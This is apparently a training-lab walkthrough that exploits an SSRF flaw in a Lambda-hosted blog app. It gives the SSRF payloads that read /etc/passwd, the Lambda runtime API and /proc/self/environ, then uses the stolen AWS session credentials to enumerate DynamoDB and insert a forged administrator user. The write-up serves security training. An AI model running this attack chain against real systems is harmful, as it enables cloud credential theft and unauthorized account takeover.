# Objectives
Perform an SSRF attack to create a new user with administrator privileges by compromising the lambda environment.

# Solution

## Step 1: Interact with the Web Application.

Open the web application put in the login credentials and start interacting with the web app.

![](https://user-images.githubusercontent.com/65826354/179528519-b5cd5552-8201-44e9-a59e-ea716d79820e.png)

![](https://user-images.githubusercontent.com/65826354/179528532-d36a8bee-0ff2-464c-b460-13fb12de4d1b.png)

## Step 2: Open and configure Burp Suite.

Open Burp Suite and make sure intercept is turned off. Click on the tab named, "Open browser" as shown in the image.

![](https://user-images.githubusercontent.com/65826354/179528542-6a6afd61-689e-4e8d-8259-a80c2b466b8a.png)

Once you click on "Open browser" a browser will open up. Then, paste the web application link into the browser and let it load.

**NOTE: If the application won't load, most probably the intercept is on, make sure it's turned off.** 

![](https://user-images.githubusercontent.com/65826354/179528546-8b69a3e8-43ad-4e7a-8761-aaf22f90476d.png)

![](https://user-images.githubusercontent.com/65826354/179528553-36fbb803-479b-448e-a803-9a4922c72712.png)

## Step 3: Log in to the web application in the newly opened browser (configured with Burp Suite).

Click on the user image at the top right-hand side corner of the web application, there you will find the option to log in. Simply, click on it and log in with the previously created credentials.

Credentials:

- Email: jameshill@ine.com
- password: jameshill@123

![](https://user-images.githubusercontent.com/65826354/179528559-b90f022f-8d4a-41a4-bd17-21c5157442b2.png)

## Step 4: Navigate to Newpost to send a request.

Before moving ahead, open Burp Suite and turn on the intercept.

Fill in the headline and enter the below-mentioned payload in the URL field.

Payload:

```bash
file:///etc/passwd/
```

**NOTE: Make sure intercept is turned on, before clicking the "Upload" button.**

![](https://user-images.githubusercontent.com/65826354/179528566-0640c0ef-ee9f-4620-8467-c1429a732ce3.png)

## Step 5: Open Burp Suite and modify the payload value.

Open burp suite to forward the request and then right-click on the screen, you will get an option to send the request to *Repeater*. Click on it and navigate to the highlighted Repeater tab, inside that replace the payload value with the one given below:

Payload:

```
value=http://localhost:9001/2018-06-01/runtime/invocation/next
```

Refer to the following images for a better understanding.

![](https://user-images.githubusercontent.com/65826354/179528574-31e7109d-9a92-4847-8465-bca431dd1af5.png)

![](https://user-images.githubusercontent.com/65826354/179528584-492f81d3-01ed-43ee-a97f-e2027bda2a36.png)

After changing the payload value, click the "Send" button to send the request.

You will receive the following response as shown in the image below.

![](https://user-images.githubusercontent.com/65826354/179528594-3366d562-f75a-4440-a491-dcdca0ab7bae.png)

Copy the link from the response.

## Step 6: Download and analyze the data received as a response.

Open the terminal and run the following command to download the data that we received from the response.

Command:

```bash
wget <link>
```

**NOTE: Replace \<link> with the link copied in the above step.**

![](https://user-images.githubusercontent.com/65826354/179528600-aae08a48-7d7e-4547-9969-e8d140df60dd.png)

After successful execution of the above command, a .png file will be downloaded.

Run the following command to view the content of the file.

```bash
cat <Name_of_the_File>
```

![](https://user-images.githubusercontent.com/65826354/179528613-537945c2-6afa-4ef9-98ad-4085a636a448.png)

We can see it is a JSON response.

Now to format it, run the below-mentioned command.

Command:
```bash
cat <Name_of_the_File> | jq
```

**NOTE: Make sure jq is installed on your machine**

After the successful execution of the above command, you will see the output like this:

![](https://user-images.githubusercontent.com/65826354/179528619-50263a66-861b-4f17-96ec-4dcc5e85c579.png)

## Step 7: Change the payload value to fetch the environment variables.

Now again open Burp Suite and change the payload value with the one given below.

Payload:
```bash
value=file:///proc/self/environ
```

![](https://user-images.githubusercontent.com/65826354/179528626-11f80308-164f-4ed6-8b2d-1b68ea40b0aa.png)

After changing the payload value, click on the "Send" button to send the request.

You will receive the following response as shown in the image below

![](https://user-images.githubusercontent.com/65826354/179528633-bb8af507-e564-43d7-8ccc-58a4e31a4ab9.png)

Now copy the URL received in the response.

## Step 8: Download the data and search for environment variables.

Open the terminal and run the following command to download the data that we received from the response.

Command:

```bash
wget <link>
```

**NOTE: Replace \<link> with the link copied in the above step.**

![](https://user-images.githubusercontent.com/65826354/179528643-2a7d8c3f-a7a9-43cd-b5ac-24c4b4c0c32c.png)

After successful execution of the above command, one .png file will get downloaded.

Run the following command to view the content of the file.

```bash
cat <Name_of_the_File>
```

![](https://user-images.githubusercontent.com/65826354/179528650-367db9b9-80e9-4d25-aab8-ab0e87156d70.png)

Now, inside this data search for ```AWS_SESSION_TOKEN```, ```AWS_ACCESS_KEY_ID```, ```AWS_SECRET_ACCESS_KEY``` and note down its values.

## Step 9: Set environment variables.

Now set the environment variables with the credentials that we got from the above step. And to do so, run the below-mentioned commands.

Commands:

```bash
export AWS_SESSION_TOKEN = <value>
export AWS_ACCESS_KEY_ID = <value>
export AWS_SECRET_ACCESS_KEY = <value>
```

![](https://user-images.githubusercontent.com/65826354/179528654-69b4e07c-0203-470e-af43-cd2e1aad4583.png)

Also, run the following command to verify our identity.

```bash
aws sts get-caller-identity
```

## Step 10: List lambda functions and check for attached role policies.

Now print the list of lambda functions with the help of the following command.

```bash
aws lambda list-function
```

You will see the following output

![](https://user-images.githubusercontent.com/65826354/179528661-d347c603-9b24-4ab8-b23e-27a59834f62e.png)

Now copy the role name from the previous output and run the following command to list the policies attached to that specific role.

Command:

```bash
aws iam list-attached-role-policies --role-name blog_app_lambda_data
```

Since we don't have IAM list privileges it will throw an error. As shown in the below image.

![](https://user-images.githubusercontent.com/65826354/179528668-438b6dc7-91a1-4005-bc65-db09abdd69c4.png)

## Step 11: List the DynamoDB tables and list their content.

To list the Dynamodb tables run the following command.

Command:

```bash
aws dynamodb list-tables
```

![](https://user-images.githubusercontent.com/65826354/179528671-b63f2dad-f511-4d9e-b277-bfae87d3bd60.png)

To list the content of the table run the below-mentioned command

Command:

```bash
aws dynamodb scan --table-name blog-users
```
You will be able to see the following output

![](https://user-images.githubusercontent.com/65826354/179528678-4b35b569-97d7-443e-a076-09a136bc9024.png)

## Step 12: Create a new file with the user details.

Copy the output of the previous code as shown in the below image.

![](https://user-images.githubusercontent.com/65826354/179528691-74fe9a72-b846-45b8-bbbb-735f9cc9b258.png)

Now, open the nano editor and create a file name *user_item*

Command:

```bash
nano user_item
```

Now paste the copied code into the *user_item* file.

Before making any edits, we will encrypt the password for our attacker user. Because we can see that passwords are stored in an encrypted format, and on analyzing it we can conclude it is a bcrypt encryption with a 10-round salt.  So, to encrypt the password for the attacker user, run the below-mentioned command and copy the encrypted output.

Command:

```bash
python3 -c 'import bcrypt; print(bcrypt.hashpw(b"attacker@123", bcrypt.gensalt(rounds=10)).decode("ascii"))'
```

![](https://user-images.githubusercontent.com/65826354/179528696-83bbdafa-defd-44fe-ae20-8fb8d43bf2fd.png)

Now again open the *user_item* file and put the encrypted password in the password field. And make the required changes as shown in the image below.

![](https://user-images.githubusercontent.com/65826354/179528715-59cb29c4-0e85-4cab-a38f-b84beb950b82.png)

## Step 13: Put the data into the Dynamodb table.

Now we will put the *user_item* file into our Dynamodb table *blog-users*. Run the command given below 

Command:

```bash
aws dynamodb put-item --table-name blog-users --item file://user_item
```

Now, check if the data was successfully added. To do so, run the command given below.

Command:

```bash
aws dynamodb scan --table-name blog-users
```

![](https://user-images.githubusercontent.com/65826354/179528719-10c3d0a6-f812-42b2-bc10-ecebac027778.png)

We can see the data was successfully added to the table.

## Step 14: Try to login into the web application using the new credentials.

First, go to the web application and log out. Then you will be redirected to the login page. There put in the below-mentioned credentials we had added to the dynamodb table.

- Email: normaluser@ine.com
- password: attacker@123

![](https://user-images.githubusercontent.com/65826354/179528727-3c350104-46f0-4e27-af9c-2d9b640aba30.png)

![](https://user-images.githubusercontent.com/65826354/179528732-10e1ff2b-ecd0-49ae-8ae0-a5f5b9f39966.png)
